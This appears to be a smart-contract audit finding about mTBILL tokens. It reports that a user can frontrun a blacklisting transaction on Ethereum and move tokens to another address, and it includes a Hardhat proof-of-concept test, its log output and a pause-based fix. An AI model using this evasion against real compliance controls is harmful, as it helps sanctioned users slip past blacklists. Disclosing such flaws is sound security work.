# User can transfer tokens before being blacklisted.

## Summary
In order to interact with the protocol, a user first must be KYC'd and then will be granted `GREENLISTED_ROLE`. A user can be granted another role after that `BLACKLISTED_ROLE`. Users with that role can not interact with `mTBill` tokens. However users can frontrun the transaction that will blacklisted them and transfer the tokens to another account.

## Vulnerability Detail
As stated in the documentation, the protocol will be deployed on Ethereum and Arbitrum. Frontrunning on Arbitrum is not possible, but on Ethereum it is. So when a `BLACKLIST_OPERATOR_ROLE` wants to blacklist a particular user, that user can move his tokens away from his address.

## Impact
Blacklist functionality not working properly on Ethereum.

## Proof of Concept
Add the following test case:

```jsx
  it.only('frontrun blacklisting', async () => {
    const { mTBILL, owner, regularAccounts, accessControl, blackListableTester } = await loadFixture(
      defaultDeploy,
    );

    // Alice will have 100e18 mTBill tokens
    const amount = parseUnits('100');
    const alice = regularAccounts[0];

    const balanceBefore = await mTBILL.balanceOf(alice.address);
    console.log("Balance before: " + balanceBefore);

    await mint({ mTBILL, owner }, alice, amount);

    const balanceAfter = await mTBILL.balanceOf(alice.address);
    console.log("Balance after: " + balanceAfter);

    // Alice sees tx that she will be blacklisted, so she transfer to other address of hers
    const aliceNew = regularAccounts[1];
    await mTBILL.connect(alice).transfer(aliceNew.address, amount);

    const aliceOldAddressBalance = await mTBILL.balanceOf(alice.address);
    const aliceNewAddressBalance = await mTBILL.balanceOf(aliceNew.address);

    console.log("Alice old address balance: " + aliceOldAddressBalance);
    console.log("Alice new address balance: " + aliceNewAddressBalance);

    // Alice will be blacklisted
    await blackList(
      { blacklistable: blackListableTester, accessControl, owner },
      alice,
    );

    // Proof that alice's old address is blacklisted, but the new one holds all tokens
    await expect(mTBILL.connect(alice).transfer(aliceNew.address, amount),).revertedWith(acErrors.WMAC_HAS_ROLE);

    await mint({ mTBILL, owner }, aliceNew, amount);
    const aliceEndBalance = await mTBILL.balanceOf(aliceNew.address);
    console.log("Alice end balance: " + aliceEndBalance);
  })
```

Run `yarn test`, the logs are:

```solidity
  Blacklistable
Balance before: 0
Balance after: 100000000000000000000
Alice old address balance: 0
Alice new address balance: 100000000000000000000
Alice end balance: 200000000000000000000
    âœ“ frontrun blacklisting

Manual Review, Hardhat

## Recommendation
Consider following this flow when blacklist is about to happen:

1. Pause the contracts.
2. Ensure that the contracts are paused when a blacklist role will be grant.
3. Unpause the contracts.
